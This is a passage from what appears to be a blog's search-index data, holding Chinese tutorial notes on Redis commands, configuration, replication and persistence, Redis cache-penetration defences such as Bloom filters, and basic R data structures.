秒后系统自动删除，注意：如果在还没有过期的时候，对值进行了改变，那么那个值会被清除。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt; set key some-value</span><br><span class=\"line\">OK</span><br><span class=\"line\">127.0.0.1:6379&gt; expire key 10</span><br><span class=\"line\">(integer) 1</span><br><span class=\"line\">127.0.0.1:6379&gt; get key (马上执行此命令)</span><br><span class=\"line\">&quot;some-value&quot;</span><br><span class=\"line\">127.0.0.1:6379&gt; get key (10s后执行此命令)</span><br><span class=\"line\">(nil)</span><br></pre></td></tr></table></figure><br>结果显示：执行 expire 命令后，马上 get 会显示 key 存在；10 秒后再 get 时，key 已经被自动删除。</p>\n<h3 id=\"查询-key-剩余生存时间\"><a href=\"#查询-key-剩余生存时间\" class=\"headerlink\" title=\"查询 key 剩余生存时间\"></a>查询 key 剩余生存时间</h3><p>限时操作可以在 set 命令中实现，并且可用 <code>ttl</code> 命令查询 key 剩余生存时间。</p>\n<p><code>ttl</code>：查找某个 key 还有多长时间过期，返回时间单位为秒。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt; set key 100 ex 30</span><br><span class=\"line\">OK</span><br><span class=\"line\">127.0.0.1:6379&gt; ttl key</span><br><span class=\"line\">(integer) 26</span><br><span class=\"line\">127.0.0.1:6379&gt; ttl key</span><br><span class=\"line\">(integer) 22</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"清除-key\"><a href=\"#清除-key\" class=\"headerlink\" title=\"清除 key\"></a>清除 key</h3><p><code>flushdb</code>：清空当前数据库中的所有键。</p>\n<p><code>flushall</code>：清空所有数据库中的所有键。</p>\n<h2 id=\"Redis-设置相关命令\"><a href=\"#Redis-设置相关命令\" class=\"headerlink\" title=\"Redis 设置相关命令\"></a>Redis 设置相关命令</h2><p>Redis 有其配置文件，可以通过 client-command 窗口查看或者更改相关配置。下面介绍相关命令。</p>\n<h3 id=\"CONFIG-GET-and-CONFIG-SET\"><a href=\"#CONFIG-GET-and-CONFIG-SET\" class=\"headerlink\" title=\"CONFIG GET and CONFIG SET\"></a>CONFIG GET and CONFIG SET</h3><p><code>config get</code>  ：用来读取运行 Redis 服务器的配置参数。</p>\n<p><code>config set</code>：用于更改运行 Redis 服务器的配置参数。</p>\n<p><code>auth</code>：认证密码。</p>\n<p>下面针对 Redis 密码的示例：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt; config get requirepass  查看密码</span><br><span class=\"line\">1) &quot;requirepass&quot;</span><br><span class=\"line\">2) &quot;&quot;</span><br><span class=\"line\">127.0.0.1:6379&gt; config set requirepass 12345 # 设置密码为12345</span><br><span class=\"line\">OK</span><br><span class=\"line\">127.0.0.1:6379&gt; config get requirepass # 报错，没有认证</span><br><span class=\"line\">(error) NOAUTH Authentication required.</span><br><span class=\"line\">127.0.0.1:6379&gt; auth 12345 # 认证密码</span><br><span class=\"line\">OK</span><br><span class=\"line\">127.0.0.1:6379&gt; config get requirepass</span><br><span class=\"line\">1) &quot;requirepass&quot;</span><br><span class=\"line\">2) &quot;12345&quot;</span><br></pre></td></tr></table></figure><br>可以通过修改 Redis 的配置文件 <code>redis.conf</code> 修改密码。</p>\n<p><code>config get</code> 命令是以 list 的 key-value 对显示的，如查询数据类型的最大条目：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt; auth 12345</span><br><span class=\"line\">OK</span><br><span class=\"line\">127.0.0.1:6379&gt; config get *max-*-entries*</span><br><span class=\"line\">1) &quot;hash-max-ziplist-entries&quot;</span><br><span class=\"line\">2) &quot;512&quot;</span><br><span class=\"line\">3) &quot;set-max-intset-entries&quot;</span><br><span class=\"line\">4) &quot;512&quot;</span><br><span class=\"line\">5) &quot;zset-max-ziplist-entries&quot;</span><br><span class=\"line\">6) &quot;128&quot;</span><br></pre></td></tr></table></figure>\n<p><code>config resetstat</code>：重置数据统计报告，通常返回值为 “OK”。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt; config resetstat</span><br><span class=\"line\">OK</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"查询信息\"><a href=\"#查询信息\" class=\"headerlink\" title=\"查询信息\"></a>查询信息</h3><p><code>info [section]</code>：查询 Redis 相关信息。</p>\n<p><code>info</code> 命令可以查询 Redis 几乎所有的信息，其命令选项有如下：</p>\n<ul>\n<li>server: Redis server 的常规信息</li>\n<li>clients: Client 的连接选项</li>\n<li>memory: 存储占用相关信息</li>\n<li>persistence: RDB and AOF 相关信息</li>\n<li>stats: 常规统计</li>\n<li>replication: Master/Slave 请求信息</li>\n<li>cpu: CPU 占用信息统计</li>\n<li>cluster: Redis 集群信息</li>\n<li>keyspace: 数据库信息统计</li>\n<li>all: 返回所有信息</li>\n<li>default: 返回常规设置信息</li>\n</ul>\n<p>若命令参数为空，info 命令返回所有信息。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt; info keyspace</span><br><span class=\"line\"># Keyspace</span><br><span class=\"line\">127.0.0.1:6379&gt; info server</span><br><span class=\"line\"># Server</span><br><span class=\"line\">redis_version:5.0.4</span><br><span class=\"line\">redis_git_sha1:00000000</span><br><span class=\"line\">redis_git_dirty:0</span><br><span class=\"line\">redis_build_id:534ea8a77d5f7efc</span><br><span class=\"line\">redis_mode:standalone</span><br><span class=\"line\">os:Linux 5.0.9-arch1-1-ARCH x86_64</span><br><span class=\"line\">arch_bits:64</span><br><span class=\"line\">multiplexing_api:epoll</span><br><span class=\"line\">atomicvar_api:atomic-builtin</span><br><span class=\"line\">gcc_version:8.2.1</span><br><span class=\"line\">process_id:19050</span><br><span class=\"line\">run_id:f9d6cf4324df9d6fb6616750de1424f28bd1fd3c</span><br><span class=\"line\">tcp_port:6379</span><br><span class=\"line\">uptime_in_seconds:73127</span><br><span class=\"line\">uptime_in_days:0</span><br><span class=\"line\">hz:10</span><br><span class=\"line\">configured_hz:10</span><br><span class=\"line\">lru_clock:13020011</span><br><span class=\"line\">executable:/usr/bin/redis-server</span><br><span class=\"line\">config_file:/etc/redis.conf</span><br></pre></td></tr></table></figure>\n<h1 id=\"Redis-的高级应用\"><a href=\"#Redis-的高级应用\" class=\"headerlink\" title=\"Redis 的高级应用\"></a>Redis 的高级应用</h1><h2 id=\"安全性\"><a href=\"#安全性\" class=\"headerlink\" title=\"安全性\"></a>安全性</h2><p>涉及到客户端连接是需要指定密码的（由于 redis 速度相当的快，一秒钟可以 150K 次的密码尝试，所以需要设置一个强度很大的密码）。</p>\n<p>设置密码的方式有两种：</p>\n<ul>\n<li>使用 <code>config set</code> 命令的 <code>requirepass</code> 参数，具体格式为 <code>config set requirepass &quot;password&quot;</code>。</li>\n<li>在 <code>redis.conf</code> 文件中设置 <code>requirepass</code> 属性，后面为密码。<br>输入认证的方式也有两种：</li>\n</ul>\n<p>登录时可以使用 <code>redis-cli -a password</code>。登录后可以使用 <code>auth password</code>。</p>\n<h2 id=\"设置密码\"><a href=\"#设置密码\" class=\"headerlink\" title=\"设置密码\"></a>设置密码</h2><p>第一种密码设置方式在上一个实验中已经提到（在 CONFIG SET 命令讲解的实例），此处我们来看看第二种方式设置密码。</p>\n<p>首先需要进入 Redis 的安装目录，然后修改配置文件 <code>redis.conf</code>。根据 grep 命令的结果，使用 vim 编辑器修改 <code># requirepass foobared</code> 为 <code>requirepass 12345</code>，然后保存退出。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">grep -n requirepass /etc/redis/redis.conf</span><br><span class=\"line\">sudo vim /etc/redis/redis.conf</span><br></pre></td></tr></table></figure>\n<h2 id=\"重启-redis-server-与-redis-cli\"><a href=\"#重启-redis-server-与-redis-cli\" class=\"headerlink\" title=\"重启 redis-server 与 redis-cli\"></a>重启 redis-server 与 redis-cli</h2><p>重启 redis server：</p>\n<p><code>sudo service redis-server restart</code> 或者 <code>sudo systemctl restart redis</code></p>\n<p>进入到 redis-cli 交互界面进行验证：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt; info</span><br><span class=\"line\">&gt; auth 12345</span><br><span class=\"line\">&gt; info</span><br><span class=\"line\">&gt; exit</span><br></pre></td></tr></table></figure>\n<p>结果表明第一次 info 命令失败，在 auth 认证之后 info 命令正常返回，最后退出 redis-cli。</p>\n<p>另外一种密码认证方式，启动客户端时验证：<code>redis-cli -a 12345</code></p>\n<h2 id=\"主从复制\"><a href=\"#主从复制\" class=\"headerlink\" title=\"主从复制\"></a>主从复制</h2><p>为了分担服务器压力，会在特定情况下部署多台服务器分别用于缓存的读和写操作，用于写操作的服务器称为主服务器，用于读操作的服务器称为从服务器。</p>\n<p>从服务器通过 psync 操作同步主服务器的写操作，并按照一定的时间间隔更新主服务器上新写入的内容。</p>\n<p>Redis 主从复制的过程：</p>\n<ol>\n<li>Slave 与 Master 建立连接，发送 psync 同步命令。</li>\n<li>Master 会启动一个后台进程，将数据库快照保存到文件中，同时 Master 主进程会开始收集新的写命令并缓存。</li>\n<li>后台完成保存后，就将此文件发送给 Slave。</li>\n<li>Slave 将此文件保存到磁盘上。</li>\n</ol>\n<p>Redis 主从复制特点：</p>\n<ol>\n<li>可以拥有多个 Slave。</li>\n<li>多个 Slave 可以连接同一个 Master 外，还可以连接到其它的 Slave。（当 Master 宕机后，相连的 Slave 转变为 Master）</li>\n<li>主从复制不会阻塞 Master，在同步数据时， Master 可以继续处理 Client 请求。</li>\n<li>提高了系统的可伸缩性。</li>\n</ol>\n<p>从服务器的主要作用是响应客户端的数据请求，比如返回一篇博客信息。</p>\n<p>上面说到了主从复制是不会阻塞 Master 的，就是说 Slave 在从 Master 复制数据时，Master 的删改插入等操作继续进行不受影响。</p>\n<p>如果在同步过程中，主服务器修改了一篇博客，而同步到从服务器上的博客是修改前的。这时候就会出现时间差，即修改了博客过后，在访问网站的时候还是原来的数据，这是因为从服务器还未同步最新的更改，这也就意味着非阻塞式的同步只能应用于对读数据延迟接受度较高的场景。</p>\n<p>要建立这样一个主从关系的缓存服务器，只需要在 Slave 端执行命令:<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># SLAVEOF IPADDRESS:PORT</span><br><span class=\"line\">&gt; SLAVEOF 127.0.0.1:6379</span><br></pre></td></tr></table></figure><br>如果主服务器设置了连接密码，就需要在从服务器中事先设置好：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">config set masterauth &lt;password&gt;</span><br></pre></td></tr></table></figure><br>这样，当前服务器就作为 127.0.0.1:6379 下的一个从服务器，它将定期从该服务器复制数据到自身。</p>\n<p>在以前的版本中（2.8 以前），你应该慎用 redis 的主从复制功能，因为它的同步机制效率低下，可以想象每一次短线重连都要复制主服务器上的全部数据，算上网络通讯所耗费的时间，反而可能达不到通过 redis 缓存来提升应用响应速度的效果。但是幸运的是，官方在 2.8 以后推出了解决方案，通过部分同步来解决大量的重复操作。</p>\n<p>这需要主服务器和从服务器都至少达到 2.8 的版本要求。</p>\n<h2 id=\"事务处理\"><a href=\"#事务处理\" class=\"headerlink\" title=\"事务处理\"></a>事务处理</h2><p>Redis 的事务处理比较简单。只能保证 client 发起的事务中的命令可以连续的执行，而且不会插入其它的 client 命令，当一个 client 在连接中发出 multi 命令时，这个连接就进入一个事务的上下文，该连接后续的命令不会执行，而是存放到一个队列中，当执行 exec 命令时，redis 会顺序的执行队列中的所有命令。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt; multi</span><br><span class=\"line\">OK</span><br><span class=\"line\">127.0.0.1:6379&gt; set name a</span><br><span class=\"line\">QUEUED</span><br><span class=\"line\">127.0.0.1:6379&gt; set name b</span><br><span class=\"line\">QUEUED</span><br><span class=\"line\">127.0.0.1:6379&gt; exec</span><br><span class=\"line\">1) OK</span><br><span class=\"line\">2) OK</span><br><span class=\"line\">127.0.0.1:6379&gt; get name</span><br><span class=\"line\">&quot;b&quot;</span><br></pre></td></tr></table></figure></p>\n<p>需要注意的是，redis 对于事务的处理方式比较特殊，它<strong>不会在事务过程中出错时恢复到之前的状态</strong>，这在实际应用中导致我们<strong>不能依赖 redis 的事务来保证数据一致性</strong>。</p>\n<h2 id=\"持久化机制\"><a href=\"#持久化机制\" class=\"headerlink\" title=\"持久化机制\"></a>持久化机制</h2><p>内存和磁盘的区别除了速度差别以外，还有就是内存中的数据会在重启之后消失，持久化的作用就是要将这些数据长久存到磁盘中以支持长久使用。</p>\n<p>Redis 是一个支持持久化的内存数据库，Redis 需要经常将内存中的数据同步到磁盘来保证持久化。</p>\n<p>Redis 支持两种持久化方式：</p>\n<ol>\n<li>snapshotting（快照）：将数据存放到文件里，默认方式。</li>\n</ol>\n<p>是将内存中的数据以快照的方式写入到二进制文件中，默认文件 dump.rdb，可以通过配置设置自动做快照持久化的方式。可配置 Redis 在 n 秒内如果超过 m 个 key 被修改就自动保存快照。比如：</p>\n<p>save 900 1：900 秒内如果超过 1 个 key 被修改，则发起快照保存。</p>\n<p>save 300 10：300 秒内如果超过 10 个 key 被修改，则快照保存。</p>\n<ol>\n<li>Append-only file（缩写为 aof）：将读写操作存放到文件中。</li>\n</ol>\n<p>由于快照方式在一定间隔时间做一次，所以如果 Redis 意外 down 掉的话，就会丢失最后一次快照后的所有修改。</p>\n<p>aof 比快照方式有更好的持久化性，是由于使用 aof 时，redis 会将每一个收到的写命令都通过 write 函数写入到文件中，当 redis 启动时会通过重新执行文件中保存的写命令来在内存中重新建立整个数据库的内容。</p>\n<p>由于 os 会在内核中缓存 write 做的修改，所以可能不是立即写到磁盘上，这样 aof 方式的持久化也还是有可能会丢失一部分数据。可以通过配置文件告诉 redis 我们想要通过 fsync 函数强制 os 写入到磁盘的时机。</p>\n<p>配置文件中的可配置参数：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">appendonly yes //启用 aof 持久化方式</span><br><span class=\"line\"></span><br><span class=\"line\"># appendfsync always //收到写命令就立即写入磁盘，最慢，但是保证了数据的完整持久化</span><br><span class=\"line\"></span><br><span class=\"line\">appendfsync everysec //每秒钟写入磁盘一次，在性能和持久化方面做了很好的折中</span><br><span class=\"line\"></span><br><span class=\"line\"># appendfsync no //完全依赖 os，性能最好，持久化没有保证</span><br></pre></td></tr></table></figure><br>在 redis-cli 的命令中，save 命令是将数据写入磁盘中。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt; help save</span><br><span class=\"line\"></span><br><span class=\"line\">  SAVE -</span><br><span class=\"line\">  summary: Synchronously save the dataset to disk</span><br><span class=\"line\">  since: 1.0.0</span><br><span class=\"line\">  group: server</span><br><span class=\"line\"></span><br><span class=\"line\">127.0.0.1:6379&gt; save</span><br><span class=\"line\">OK</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"虚拟内存的使用\"><a href=\"#虚拟内存的使用\" class=\"headerlink\" title=\"虚拟内存的使用\"></a>虚拟内存的使用</h2><p>虚拟内存管理在 2.6 及之上版本取消了，取消了是指这部分内容在后面的版本会由 redis 软件自身管理，在本实验中，选择的是 2.8.4 版本的 redis，所以实验中的配置文件没有虚拟内存管理功能的配置选项，此处仅为讲解。</p>\n<p>Redis 的虚拟内存是暂时把不经常访问的数据从内存交换到磁盘中，从而腾出内存空间用于其它的访问数据，尤其对于 redis 这样的内存数据库，内存总是不够用的。除了分隔到多个 redis server 外，提高数据库容量的方法就是使用虚拟内存，把那些不常访问的数据交换到磁盘上。</p>\n<p>通过配置 vm 相关的 <code>redis.config</code> 配置：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 开启 vm 功能</span><br><span class=\"line\">vm-enable yes</span><br><span class=\"line\"></span><br><span class=\"line\"># 交换出来的 value 保存的文件路径</span><br><span class=\"line\">vm-swap-file /tmp/redis.swap</span><br><span class=\"line\"></span><br><span class=\"line\"># redis 使用的最大内存上限</span><br><span class=\"line\">vm-max-memory 10000000</span><br><span class=\"line\"></span><br><span class=\"line\"># 每个页面的大小 32 字节</span><br><span class=\"line\">vm-page-size 32</span><br><span class=\"line\"></span><br><span class=\"line\"># 最多使用多少个页面</span><br><span class=\"line\">vm-pages 123217729</span><br><span class=\"line\"></span><br><span class=\"line\"># 用于执行 value 对象换入的工作线程数量</span><br><span class=\"line\">vm-max-threads 4</span><br></pre></td></tr></table></figure></p>\n","tags":["Redis","数据库"]},{"title":"Redis高并发","url":"/2020/10/22/Redis%E9%AB%98%E5%B9%B6%E5%8F%91/","content":"<h2 id=\"Redis缓存雪崩-穿透-击穿\"><a href=\"#Redis缓存雪崩-穿透-击穿\" class=\"headerlink\" title=\"Redis缓存雪崩/穿透/击穿\"></a>Redis缓存雪崩/穿透/击穿</h2><p>当一个系统为 <code>Server =&gt; Redis =&gt; DB</code> 的架构，请求先在Redis中查找数据，查找失败则在数据库中查找，在高并发场景下，以下几种情形容易造成系统宕机。</p>\n<h3 id=\"缓存雪崩\"><a href=\"#缓存雪崩\" class=\"headerlink\" title=\"缓存雪崩\"></a>缓存雪崩</h3><p>统一时间<strong>大量的缓存key</strong>失效，造成数据库响应不即时。</p>\n<p>解决方案:</p>\n<ul>\n<li>不设置key失效</li>\n<li>将key平均分布在不同节点上</li>\n<li>设置缓存刷新的定时任务</li>\n</ul>\n<span id=\"more\"></span>\n<h3 id=\"缓存穿透\"><a href=\"#缓存穿透\" class=\"headerlink\" title=\"缓存穿透\"></a>缓存穿透</h3><p>大量请求Redis中没有的数据，请求直接穿过Redis打到数据库。常用于黑客攻击，例如数据库中不存在id为-1的项，故意构造的id=-1的查询请求。</p>\n<p>解决方案:</p>\n<ul>\n<li>IP黑名单</li>\n<li>将结果不存在的情况也缓存到Redis</li>\n<li>server参数合法性检验</li>\n<li>布隆过滤器</li>\n</ul>\n<h3 id=\"缓存击穿\"><a href=\"#缓存击穿\" class=\"headerlink\" title=\"缓存击穿\"></a>缓存击穿</h3><p>大量请求<strong>某个热点key</strong>，当这个key突然消失，大量请求直接打到数据库上。</p>\n<p>解决方案:</p>\n<ul>\n<li>key永远不过期</li>\n<li>分布式锁(zookeeper) 只让一个线程抢到锁，其他进程sleep，然后这个进程执行查询并缓存到Redis</li>\n</ul>\n<h2 id=\"布隆过滤器-BloomFilter\"><a href=\"#布隆过滤器-BloomFilter\" class=\"headerlink\" title=\"布隆过滤器(BloomFilter)\"></a>布隆过滤器(BloomFilter)</h2><p>布隆过滤器是一个很长的二进制向量和一系列随机映射函数（哈希函数）。</p>\n<p>布隆过滤器可以用于检索一个元素是否在一个集合中。它的优点是空间效率和查询时间都远远超过一般的算法，缺点是有一定的误识别率和删除困难。</p>\n<p>布隆过滤器可以用于解决缓存穿透。在具体使用时需要设置误判率(fpp)。误判率设置越低，占用空间越大，hash函数个数越多，性能越差。</p>\n<p>根据把<strong>所有</strong>合法的或者不合法的内容放入布隆过滤器，有两种应用方式：白名单/黑名单：</p>\n<p><img src=\"Screenshot_20201021_191757.png\" alt=\"\"></p>\n<p><img src=\"Screenshot_20201021_192035.png\" alt=\"\"></p>\n<p>黑名单方式下，一开始黑名单为空，需要在逐渐被攻击的过程中逐步完善黑名单。在完善黑名单的过程中依然有缓存穿透被攻击的风险。</p>\n<p>布隆过滤器业务场景：</p>\n<ul>\n<li>防止已读的推荐内容的重复推送</li>\n<li>好友白名单判断</li>\n</ul>\n<h2 id=\"布谷鸟过滤器\"><a href=\"#布谷鸟过滤器\" class=\"headerlink\" title=\"布谷鸟过滤器\"></a>布谷鸟过滤器</h2><h2 id=\"分布式锁\"><a href=\"#分布式锁\" class=\"headerlink\" title=\"分布式锁\"></a>分布式锁</h2>"},{"title":"R语言学习（一）基本容器","url":"/2018/10/06/R%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89%E5%9F%BA%E6%9C%AC%E5%AE%B9%E5%99%A8/","content":"<blockquote>\n<p>R语言是一门数据处理语言，本文记录R语言学习的过程和一些注意点</p>\n</blockquote>\n<h2 id=\"基本数据结构\"><a href=\"#基本数据结构\" class=\"headerlink\" title=\"基本数据结构\"></a>基本数据结构</h2><p>对于数据集行和列的不同术语：</p>\n<ul>\n<li>统计学：观测(observation)/变量(variable)</li>\n<li>数据分析师：记录(record)/字段(field)</li>\n<li>机器学习与数据挖掘：示例(example)/属性(attribute)</li>\n</ul>\n<p>R的数据结构包括向量，数组，数据框和列表，R可以处理的数据类型成为模式(modes)，包括数值型，字符型，布尔型，复数型和原生型（字节）</p>\n<p>向量，矩阵，数组的本质是数组，唯独分别是一维，二维，更高，三者必须有相同的模式，而列表每一个元素可以是不同类型，是一个广义表。</p>\n<span id=\"more\"></span>\n<h3 id=\"向量-Vector\"><a href=\"#向量-Vector\" class=\"headerlink\" title=\"向量(Vector)\"></a>向量(Vector)</h3><p>创建：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">a &lt;- c(1,2,3,4,5)</span><br><span class=\"line\">b &lt;- c(&quot;one&quot;,&quot;two&quot;,&quot;three&quot;)</span><br><span class=\"line\">d &lt;- c(1:10)</span><br></pre></td></tr></table></figure><br>其中d是1~10的数组成的数组，R中<code>a:b</code>表示a～b的连续数组成的向量，自动推导升降序。</p>\n<p>访问可以通过方括号里下标访问返回一个元素，也可以访问一个向量构成的下标，返回一个子向量<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">a[3]</span><br><span class=\"line\">a[c(1,3,5)</span><br><span class=\"line\">a(1:3)</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"矩阵-Matrix\"><a href=\"#矩阵-Matrix\" class=\"headerlink\" title=\"矩阵(Matrix)\"></a>矩阵(Matrix)</h3><h4 id=\"创建\"><a href=\"#创建\" class=\"headerlink\" title=\"创建\"></a>创建</h4><p>矩阵构造至少要有三个参数，第一个是一维向量，第二三是行列元素数目，第三和第四可选，分别是是否按行填充（默认按列）和两个维度的属性名（包含了两个向量的list）<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">matrix &lt;- matrix(vector,nrow=number_of_rows,ncol=number_of_columns,byrow=logical_value,dimnames=list(char_vector_rownames,char_vector_colnames))</span><br></pre></td></tr></table></figure><br>例子：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">cells &lt;- c(1,26,24,68)</span><br><span class=\"line\">rnames &lt;- c(&quot;R1&quot;, &quot;R2&quot;)</span><br><span class=\"line\">cnames &lt;- c(&quot;C1&quot;, &quot;C2&quot;)</span><br><span class=\"line\">mymatrix &lt;- matrix(cells, nrow=2, ncol=2, byrow=TRUE,</span><br><span class=\"line\">dimnames=list(rnames, cnames))</span><br><span class=\"line\">mymatrix</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"访问\"><a href=\"#访问\" class=\"headerlink\" title=\"访问\"></a>访问</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">m[1,2]</span><br><span class=\"line\">m[2,]</span><br><span class=\"line\">m[,3]</span><br><span class=\"line\">m[1,c(1,3)]</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>R中忽略某个位置的参数而使用逗号直接隔开，则该缺省属性视为通配符</p>\n</blockquote>\n<h3 id=\"数组-Arrays\"><a href=\"#数组-Arrays\" class=\"headerlink\" title=\"数组(Arrays)\"></a>数组(Arrays)</h3><p>数组的维度可以大于2,可以理解为高维度的矩阵</p>\n<h4 id=\"创建-1\"><a href=\"#创建-1\" class=\"headerlink\" title=\"创建\"></a>创建</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">myarray &lt;- array(vector,dimensions,dimnames)</span><br></pre></td></tr></table></figure>\n<p>其中vector包含了数组中的数据,dimensions是一个数值型向量,给出了各个维度下标的最大值,而dimnames是可选的、各维度名称标签的列表。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">dim1 &lt;- c(&quot;A1&quot;, &quot;A2&quot;)</span><br><span class=\"line\">dim2 &lt;- c(&quot;B1&quot;, &quot;B2&quot;, &quot;B3&quot;)</span><br><span class=\"line\">dim3 &lt;- c(&quot;C1&quot;, &quot;C2&quot;, &quot;C3&quot;, &quot;C4&quot;)</span><br><span class=\"line\">z &lt;- array(1:24, c(2,3,4),dimnames=list(dim1, dim2, dim3))</span><br><span class=\"line\">z</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"访问-1\"><a href=\"#访问-1\" class=\"headerlink\" title=\"访问\"></a>访问</h4><p>访问类似矩阵，<code>z[1,2,3]</code>可以具体对一个元素访问，也可以空缺某个参数或者填入向量，返回一个子数组</p>\n<h3 id=\"数据框-DataFrames\"><a href=\"#数据框-DataFrames\" class=\"headerlink\" title=\"数据框(DataFrames)\"></a>数据框(DataFrames)</h3><h4 id=\"创建-2\"><a href=\"#创建-2\" class=\"headerlink\" title=\"创建\"></a>创建</h4><p>通过传入若干个向量的变长参数，每个属性的名称即为对应向量名<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">patientID &lt;- c(1, 2, 3, 4)</span><br><span class=\"line\">age &lt;- c(25, 34, 28, 52)</span><br><span class=\"line\">diabetes &lt;- c(&quot;Type1&quot;, &quot;Type2&quot;, &quot;Type1&quot;, &quot;Type1&quot;)</span><br><span class=\"line\">status &lt;- c(&quot;Poor&quot;, &quot;Improved&quot;, &quot;Excellent&quot;, &quot;Poor&quot;)</span><br><span class=\"line\">patientdata &lt;- data.frame(patientID, age, diabetes,status)</span><br><span class=\"line\">patientdata</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"访问-2\"><a href=\"#访问-2\" class=\"headerlink\" title=\"访问\"></a>访问</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">patientdata[1:2] #选取第1、2列</span><br><span class=\"line\">patientdata[c(&quot;diabetes&quot;,&quot;status&quot;)]</span><br><span class=\"line\">patientdata[2,] #选取第2行</span><br><span class=\"line\">patientdata$age #选取age列</span><br><span class=\"line\">patientdata$age[2] #选取age列的第二个</span><br></pre></td></tr></table></figure>\n<p><code>$</code>表示选取数据框中某个特定变量，相当于一般计算机语言中的<code>.</code></p>\n<h4 id=\"搜索路径\"><a href=\"#搜索路径\" class=\"headerlink\" title=\"搜索路径\"></a>搜索路径</h4><p>比如，刚刚建立好上述patientdata的数据框后，可以访问age和status变量，则说明age和status在当前R的搜索路径中，此时执行<code>rm age</code>和<code>rm status</code>则将这两个变量从搜索路径中删除，此时执行<code>plot(age,status)</code>来画图则会失败</p>\n<h4 id=\"attach-detach-函数\"><a href=\"#attach-detach-函数\" class=\"headerlink\" title=\"attach()/detach()函数\"></a>attach()/detach()函数</h4><p><code>attach()</code>函数可以吧一个数据框添加到当前的搜索路径中：<code>attach(patientdata)</code>,则此时<code>age</code>和<code>status</code>则有在搜索路径中了，此时<code>plot(age,status)</code>又可以使用了</p>\n<p><code>detach()</code>函数可以将数据框从搜索路径中移除，当<code>detach()</code>造成数据对象重名时,原始对象将取得优先权。</p>\n<h4 id=\"with-函数\"><a href=\"#with-函数\" class=\"headerlink\" title=\"with()函数\"></a>with()函数</h4><p>针对某一个数据框操作，可以用<code>with()</code>,不需要担心名称的冲突，这样可以避免频繁的<code>atach()</code>和<code>detach()</code><br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">with(patientdata,&#123;</span><br><span class=\"line\">plot(patientID,age)</span><br><span class=\"line\">plot(patientID,status)</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure><br>当语句只有一条时，可以省略大括号</p>\n<h4 id=\"因子-Factors\"><a href=\"#因子-Factors\" class=\"headerlink\" title=\"因子(Factors)\"></a>因子(Factors)</h4><ul>\n<li>数据类型分为：<ul>\n<li>类别(nominal:糖尿病类型)</li>\n<li>有序(ordinal:病情好中坏)</li>\n<li>连续型(continuous:年龄)</li>\n</ul>\n</li>\n<li>在R中,类别变量和有序变量称为因子。因子在R中非常重要,因为它决定了数据的<strong>分析方式</strong>以及如何进行<strong>视觉呈现</strong>。<h4 id=\"factor-函数\"><a href=\"#factor-函数\" class=\"headerlink\" title=\"factor()函数\"></a>factor()函数</h4>函数factor()以一个整数向量的形式存储类别值。<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">diabetes &lt;- c(&quot;Type1&quot;, &quot;Type2&quot;,&quot;Type1&quot;,&quot;Type1&quot;)</span><br><span class=\"line\">str(diabetes) #str()函数会输出一个R对象的结构</span><br><span class=\"line\">#输出:chr [1:4] &quot;Type1&quot; &quot;Type2&quot; &quot;Type1&quot; &quot;Type1&quot;</span><br><span class=\"line\">diabetes &lt;- factor(diabetes)</span><br><span class=\"line\">str(diabetes)</span><br><span class=\"line\">#输出:Factor w/ 2 levels &quot;Type1&quot;,&quot;Type2&quot;: 1 2 1 1</span><br></pre></td></tr></table></figure>\n对于字符类型的向量，因子的水平依据字典序创建，可以指定level选项来覆盖默认排序<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">status &lt;- 